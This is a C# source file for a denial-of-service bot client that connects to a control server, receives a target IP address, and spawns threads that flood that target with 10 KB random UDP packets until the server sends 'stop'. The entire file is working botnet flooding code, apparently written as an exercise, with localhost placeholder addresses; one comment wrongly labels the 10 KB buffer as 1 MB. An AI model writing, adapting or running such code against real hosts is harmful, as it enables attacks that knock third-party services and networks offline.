using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Text;

namespace bot
{
    class Bot
    {
        private static UdpClient server = new UdpClient();
        private static UdpClient target = new UdpClient();
        private static IPEndPoint ep
            = new IPEndPoint(IPAddress.Parse("127.0.0.1"), 11000);
        private static IPEndPoint tarEp
            = new IPEndPoint(IPAddress.Parse("127.0.0.1"), 11000); // temp IP
        static void Main(string[] args)
        {
            // parse the number of bots from command line
            int nums = Int32.Parse(args[0]);
            Console.WriteLine("Beginning bot startup!");
            // connect to server and send number of bots
            server.Connect(ep);
            Console.WriteLine("Connected to server: " + ep.ToString());
            server.Send(Encoding.ASCII.GetBytes(args[0]));
            // receive the IP address from the client
            byte[] receivedData = server.Receive(ref ep);
            // set the target endpoint 
            tarEp = new IPEndPoint(new IPAddress(receivedData), 24);
            target.Connect(tarEp);
            Console.WriteLine("Connected to target: " + tarEp.ToString());
            // initialize threads
            Thread[] th = new Thread[nums];
            for (int i = 0; i < nums; i++)
            {
                th[i] = new Thread(StartBot);
                th[i].Start();
            }
            // wait for threads to complete
            for (int i = 0; i < nums; i++)
            {
                th[i].Join();
            }
            Console.WriteLine("Sending completion code to server ...");
            // once threads are completed send the completion code
            server.Send(Encoding.ASCII.GetBytes("complete"));
            target.Close();
        }
        /**
         * This function is called by each thread as it is created. It uses
         * target IP given by the server, and spams 10kb datagram packets to
         * the target. It listens on the server line for a "stop" command, 
         * and closes when it does.
         */
        public static void StartBot()
        {
            Console.WriteLine("Bot activating!");
            // create random data
            Random rnd = new Random();
            byte[] b = new byte[10 * 1024]; // 1MB of bytes
            rnd.NextBytes(b);
            byte[] receivedData = new byte[0];
            // while the stopcode is not active, loop
            while (Encoding.UTF8.GetString(receivedData) != "stop")
            {
                // check if there is more data on the connection
                if (server.Available > 0)
                {
                    receivedData = server.Receive(ref ep);
                    Console.WriteLine("received data from " + ep.ToString());
                    Console.WriteLine("received data: " +
                        Encoding.UTF8.GetString(receivedData));
                    // the data received shoud be "stop" specifically,
                    // if not it will continue to loop
                }
                // send random data to the target
                target.Send(b);
                //Console.WriteLine("Sent! ");// + Encoding.UTF8.GetString(b));
            }
        }
    }
}